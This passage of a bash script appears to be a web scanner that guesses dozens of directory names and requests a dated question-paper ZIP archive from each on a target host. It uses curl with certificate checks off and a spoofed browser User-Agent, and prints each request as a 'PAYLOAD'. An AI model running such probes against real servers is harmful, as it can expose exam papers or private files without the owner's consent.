echo -n "Payload [QPAuto-Manager/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPAuto-Manager/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPAuto-Manager/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [DataPipeline-QPFile/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}DataPipeline-QPFile/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}DataPipeline-QPFile/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QP_Mgmt/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QP_Mgmt/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QP_Mgmt/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPMasterPortal/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPMasterPortal/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPMasterPortal/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Service_QPControl/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Service_QPControl/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Service_QPControl/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPSystem_UploadService/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPSystem_UploadService/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPSystem_UploadService/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QuestionPaper-Suite/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QuestionPaper-Suite/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QuestionPaper-Suite/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [BatchProcessor_TestPaper/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}BatchProcessor_TestPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}BatchProcessor_TestPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [DataUpload-ExamPaper/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}DataUpload-ExamPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}DataUpload-ExamPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPControl_Upload/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPControl_Upload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPControl_Upload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPMonitor_Management/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPMonitor_Management/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPMonitor_Management/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [System_QPDatabase/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}System_QPDatabase/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}System_QPDatabase/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Suite-QPMaster/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Suite-QPMaster/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Suite-QPMaster/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QstnPaperDataOps/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QstnPaperDataOps/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QstnPaperDataOps/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [MonitoringTool_QPUpload/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}MonitoringTool_QPUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}MonitoringTool_QPUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Q_PDashboard/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Q_PDashboard/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Q_PDashboard/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QstnPaper-Monitoring/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QstnPaper-Monitoring/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QstnPaper-Monitoring/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPBFile_ProcessingSuite/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPBFile_ProcessingSuite/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPBFile_ProcessingSuite/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [DataSync-QsnPaper/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}DataSync-QsnPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}DataSync-QsnPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [DataProcessingQP/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}DataProcessingQP/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}DataProcessingQP/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [SuiteQuestionPaper/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}SuiteQuestionPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}SuiteQuestionPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Upload-QPSystem/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Upload-QPSystem/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Upload-QPSystem/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [TestPaperSystem/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}TestPaperSystem/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}TestPaperSystem/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Mgmt-QPHandler/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Mgmt-QPHandler/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Mgmt-QPHandler/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPCloud-DataSync/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPCloud-DataSync/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPCloud-DataSync/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPControl_Dashboard/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPControl_Dashboard/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPControl_Dashboard/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Service_TestPaper/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Service_TestPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Service_TestPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPManager-BulkUpload/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPManager-BulkUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPManager-BulkUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [DataSync-QPMonitor/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}DataSync-QPMonitor/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}DataSync-QPMonitor/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [PanelQPSystem/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}PanelQPSystem/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}PanelQPSystem/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPFile_Module/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPFile_Module/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPFile_Module/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPWorkflowSync/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPWorkflowSync/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPWorkflowSync/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Automation-QP/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Automation-QP/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Automation-QP/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [BulkUpload-QPBFile/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}BulkUpload-QPBFile/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}BulkUpload-QPBFile/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Workflow-ExamPaper/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Workflow-ExamPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Workflow-ExamPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [HandlingModule_QPBData/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}HandlingModule_QPBData/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}HandlingModule_QPBData/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Dashboard_QPProcessing/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Dashboard_QPProcessing/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Dashboard_QPProcessing/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [AutoUpload-QPBData/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}AutoUpload-QPBData/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}AutoUpload-QPBData/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Processing-QPAdmin/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Processing-QPAdmin/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
